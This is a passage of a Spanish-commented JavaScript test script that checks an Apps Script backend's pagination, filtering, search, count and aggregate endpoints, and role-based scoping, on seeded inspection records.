log(!env.estado.logs.some(l => l[0] === 'error'), 'Sin errores inesperados del servidor' + (env.estado.logs.filter(l => l[0] === 'error').map(l => ': ' + l[1].slice(0, 200)).join('')));

seccion('Paginación, filtros y agregados en el servidor (QUERY_DB / COUNT_DB / AGG_DB)');
// Apps Script tiene que dar los MISMOS numeros que Supabase: si no, el mismo
// KPI cambia de valor al cambiar de proveedor.
const HOY_P = new Date(Date.now() - 5 * 3600 * 1000).toISOString().slice(0, 10);
for (let i = 0; i < 12; i++) {
  sync(tokA, '03_Inspecciones', {
    UUID: 'AGG-' + i,
    Estado_Actual: (i % 3 === 0) ? 'Cerrado' : 'Abierto',
    Plazo: (i === 11) ? '2020-01-01' : '2099-12-31',
    Area_Inspeccion: (i === 11) ? 'Planta' : 'Mina',
    Descripcion_Tecnica: 'Hallazgo ' + i
  }, null, 500 + i);
}

const consultar = (t, opts) => como(t, Object.assign({ action: 'QUERY_DB', moduleName: '03_Inspecciones' }, opts));
const contar    = (t, opts) => como(t, Object.assign({ action: 'COUNT_DB', moduleName: '03_Inspecciones' }, opts));
const agregar   = (t, opts) => como(t, Object.assign({ action: 'AGG_DB',   moduleName: '03_Inspecciones' }, opts));

let pg = consultar(tokA, { pageSize: 5, desde: 0 });
log(pg.status === 'OK' && pg.payload.length === 5 && pg.total === 12 && pg.hayMas === true,
    'QUERY_DB devuelve 5 filas de 12 y avisa de que hay más');
const pg2 = consultar(tokA, { pageSize: 5, desde: 10 });
log(pg2.payload.length === 2 && pg2.hayMas === false, 'La última página no dice que haya más');
const idsPg1 = pg.payload.map(x => x.UUID);
log(idsPg1.every(u => pg2.payload.indexOf(u) === -1), 'Las páginas no se solapan');

log(contar(tokA, { cond: {} }).total === 12, 'COUNT_DB cuenta las 12 sin devolver filas');
log(contar(tokA, { cond: { Estado_Actual: { neq: 'Cerrado' } } }).total === 8, 'COUNT_DB con neq');
log(contar(tokA, { cond: { Estado_Actual: { neq: 'Cerrado' }, Plazo: { lt: HOY_P } } }).total === 1,
    'Vencidas: 1 (la fila sin plazo o con plazo futuro no cuenta)');
log(contar(tokA, { cond: { $o: [{ Area_Inspeccion: { eq: 'Planta' } }, { Plazo: { lt: '2021-01-01' } }] } }).total === 1,
    'El operador $o (alternativas) funciona igual que en Postgres');

// El filtro y la busqueda encuentran lo que NO esta en la primera pagina
const porArea = consultar(tokA, { pageSize: 5, filtros: { Area_Inspeccion: 'Planta' } });
log(porArea.total === 1 && porArea.payload[0].UUID === 'AGG-11',
    'Filtrar por área encuentra la fila 12, fuera de la primera página');
const porTexto = consultar(tokA, { pageSize: 5, busqueda: 'Hallazgo 11' });
log(porTexto.total === 1 && porTexto.payload[0].UUID === 'AGG-11', 'La búsqueda libre recorre todo el módulo');
log(consultar(tokA, { pageSize: 5, busqueda: 'no-existe-nada' }).total === 0, 'Una búsqueda sin resultados da 0, no la tabla entera');

log(agregar(tokA, { metrica: 'max', campo: 'Plazo', cond: {} }).valor === '2099-12-31', 'AGG_DB max() sobre una fecha');
log(agregar(tokA, { metrica: 'min', campo: 'Plazo', cond: {} }).valor === '2020-01-01', 'AGG_DB min() sobre una fecha');
log(agregar(tokA, { metrica: 'median', campo: 'Plazo' }).status === 'ERROR', 'Una métrica no permitida se rechaza');

// AGG_BATCH: los KPI de un modulo en UNA peticion. En Sheets no hay indices y
// _MEMO se vacia en cada peticion, asi que pedirlos sueltos releia la hoja una
// vez por KPI -mas trabajo del que hacia la app antes de paginar-.
const lote = como(tokA, { action: 'AGG_BATCH', moduleName: '03_Inspecciones', consultas: [
  { metrica: 'count', cond: {} },
  { metrica: 'count', cond: { Estado_Actual: { neq: 'Cerrado' } } },
  { metrica: 'count', cond: { Estado_Actual: { neq: 'Cerrado' }, Plazo: { lt: HOY_P } } },
  { metrica: 'max', campo: 'Plazo', cond: {} }
]});
log(lote.status === 'OK' && lote.valores.length === 4, 'AGG_BATCH responde un valor por consulta');
log(lote.valores[0] === '12' && lote.valores[1] === '8' && lote.valores[2] === '1' && lote.valores[3] === '2099-12-31',
    'Y cada valor coincide con el de AGG_DB/COUNT_DB por separado [' + lote.valores.join(' · ') + ']');
const loteMalo = como(tokA, { action: 'AGG_BATCH', moduleName: '03_Inspecciones', consultas: [
  { metrica: 'count', cond: {} }, { metrica: 'median', campo: 'Plazo' }
]});
log(loteMalo.valores[0] === '12' && loteMalo.valores[1] === null,
    'Una consulta mala del lote no tumba las demas');
log(como(tokA, { action: 'AGG_BATCH', moduleName: '03_Inspecciones', consultas: [] }).valores.length === 0,
    'Un lote vacio no lee la hoja');

// El alcance del rol se aplica tambien al conteo y a la pagina.
// tokT ya no vale: a esta altura de la prueba al Trabajador le cambiaron la
// contrasena, y eso cierra sus sesiones anteriores a proposito.
const tokTx = login('33333333', 'Nueva2026x').userData.SessionToken;
const totalTrab = contar(tokTx, { cond: {} }).total;
const leeTrab = como(tokTx, { action: 'READ_DB', moduleName: '03_Inspecciones' }).payload.length;
log(totalTrab === leeTrab, 'El conteo del Trabajador coincide con las filas que puede leer (' + totalTrab + ')');
log(totalTrab < 12, 'Y es menor que el del Admin: el alcance se aplica al agregado');
log(como('', { action: 'QUERY_DB', moduleName: '03_Inspecciones' }).status === 'INVALID_TOKEN',
    'Sin sesión no se consulta ni se cuenta');

console.log(`\nRESULTADO: ${ok} correctas, ${fallos} fallidas`);
process.exit(fallos ? 1 : 0);
